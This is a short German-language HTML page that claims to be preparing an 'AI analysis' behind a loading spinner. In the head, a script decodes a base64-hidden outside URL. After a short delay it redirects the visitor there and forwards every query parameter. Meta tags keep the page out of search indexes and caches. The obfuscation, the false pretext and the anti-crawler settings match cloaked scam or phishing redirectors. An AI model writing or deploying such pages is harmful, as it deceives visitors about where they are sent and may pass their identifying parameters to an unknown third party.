<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Analyse wird vorbereitet...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="robots" content="noindex, nofollow">
  <meta name="googlebot" content="noindex, nofollow">
  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">

  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      color: #333;
      text-align: center;
      padding: 80px 20px;
    }

    .spinner {
      margin: 30px auto;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #f4c542;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>

  <script>
  setTimeout(function () {
    const encoded = "aHR0cHM6Ly9zbGlwcGxpcy5jb20=";
    const decoded = atob(encoded);

    const currentParams = new URLSearchParams(window.location.search);
    const targetUrl = new URL(decoded);

    currentParams.forEach((value, key) => {
      if (!targetUrl.searchParams.has(key)) {
        targetUrl.searchParams.set(key, value);
      }
    });

    window.location.href = targetUrl.toString();
  }, 1800);
</script>
  
</head>
<body>
  <h2>Ihre KI-Analyse wird vorbereitet...</h2>
  <div class="spinner"></div>
  <p>Bitte einen Moment Geduld.</p>
</body>
</html>
